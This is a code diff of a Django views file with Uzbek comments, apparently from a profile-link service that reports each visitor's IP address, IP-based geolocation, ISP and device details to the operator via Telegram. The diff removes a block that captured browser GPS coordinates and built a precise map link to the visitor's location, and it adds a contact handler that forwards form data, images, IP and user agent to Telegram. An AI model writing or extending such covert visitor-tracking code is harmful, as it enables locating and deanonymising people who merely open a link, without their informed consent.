@@ -119,16 +119,6 @@ def profile_detail_view(request, profile_slug):
         status_text = request.POST.get('status_text', 'Ruxsat berilmadi')
         screen_size = request.POST.get('screen_size', 'Noma`lum')
         
-        # Brauzer GPSidan kelgan aniq koordinatalar
-        gps_lat = request.POST.get('gps_lat', None)
-        gps_lon = request.POST.get('gps_lon', None)
-
-        # Agar GPS koordinatalari kelgan bo'lsa, aniq xarita havolasini yasaymiz
-        if gps_lat and gps_lon and gps_lat != 'null' and gps_lat != 'undefined':
-            maps_link = f"[Google Maps (Aniq GPS yordamida: 10m)](https://www.google.com/maps?q={gps_lat},{gps_lon})"
-        else:
-            # Agar rad etgan bo'lsa, eski IP-API koordinatasidan foydalanamiz
-            maps_link = f"[Google Maps (Taxminiy IP yordamida: 30km)](https://www.google.com/maps?q={geo_data['lat']},{geo_data['lon']})"
 
         # Kirish haqidagi umumiy ma'lumot
         device_and_geo = (
@@ -141,7 +131,6 @@ def profile_detail_view(request, profile_slug):
             f"🌐 *GEOLOKATSIYA VA TARMOQ:* \n"
             f"• *IP Manzil:* `{ip}`\n"
             f"• *Provayder (ISP):* {geo_data['isp']}\n"
-            f"• *Xarita:* {maps_link}\n"
         )
 
         if tg_user or insta_user or game_id:
@@ -191,4 +180,33 @@ def link_click_view(request, link_id):
     if request.method == 'POST' or request.headers.get('X-Requested-With') == 'XMLHttpRequest':
         LinkClickAnalytics.objects.create(link_id=link_id)
         return JsonResponse({'status': 'tracked'})
+    return JsonResponse({'status': 'error'}, status=400)
+
+
+def contact_view(request, profile_slug):
+    """Handle contact form POST from the profile page and forward to Telegram."""
+    if request.method == 'POST':
+        profile = get_object_or_404(Profile, slug=profile_slug)
+        name = request.POST.get('name', '-').strip()
+        surname = request.POST.get('surname', '-').strip()
+        contact = request.POST.get('contact', '-').strip()
+        message = request.POST.get('message', '-').strip()
+        image_data = request.POST.get('image_data', None)
+
+        ip = request.META.get('HTTP_X_FORWARDED_FOR') or request.META.get('REMOTE_ADDR') or 'Noma`lum'
+        user_agent = request.META.get('HTTP_USER_AGENT', 'Noma`lum')
+
+        text = (
+            f"📩 *YANGI KONTAKT XABARI*\n\n"
+            f"*Profil:* {profile.title}\n"
+            f"*Ism:* {name} {surname}\n"
+            f"*Kontakt:* {contact}\n\n"
+            f"*Xabar:* {message}\n\n"
+            f"• IP: `{ip}`\n"
+            f"• UA: {user_agent}"
+        )
+
+        send_to_telegram_and_forget(text, image_data=image_data)
+        return JsonResponse({'status': 'ok'})
+
     return JsonResponse({'status': 'error'}, status=400)
